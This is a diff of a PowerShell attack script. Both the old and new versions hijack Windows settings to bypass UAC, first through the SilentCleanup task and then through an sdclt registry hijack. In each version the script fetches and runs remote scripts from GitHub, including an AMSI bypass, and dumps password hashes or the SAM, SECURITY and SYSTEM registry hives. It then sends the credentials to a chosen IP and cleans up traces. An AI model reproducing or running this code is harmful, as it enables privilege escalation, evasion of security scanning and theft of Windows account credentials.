@@ -1,11 +1,11 @@
 ﻿
 $ip = 'localhost'
-$registryPath = "HKCU:\Environment"
-$Name = "windir"
-$Value = "powershell -windowstyle hidden IEX " + "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1');IEX " + "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Get-PassHashes.ps1');IEX " + "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Invoke-Transmission.ps1');Get-PassHashes | Out-String | Invoke-Transmission -ip " + $ip + ";#"
-Set-ItemProperty -Path $registryPath -Name $name -Value $Value
-schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
-sleep 2
-Remove-ItemProperty -Path $registryPath -Name $name
-taskkill /f /im cmd.exe
+$Value = "powershell -windowstyle hidden `$a=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1').Content);IEX `$a;`$b=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Invoke-Transmission.ps1').Content);IEX `$b;reg save HKLM\sam C:\Users\Public\sam;reg save HKLM\security C:\Users\Public\security;reg save HKLM\system C:\Users\Public\system;Invoke-Transmission -ip $ip"
+[System.Environment]::SetEnvironmentVariable('A', $Value,[System.EnvironmentVariableTarget]::User)
+New-Item -Path 'C:\Users\Public\A.bat' -Value '%A%'
+New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force -Value "C:\Users\Public\A.bat"
+New-ItemProperty -Path "HKCU:\Software\Classes\Folder\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+start cmd "/c start sdclt"
+sleep 3
+Remove-Item "HKCU:\Software\Classes\Folder\shell\open\command"
 
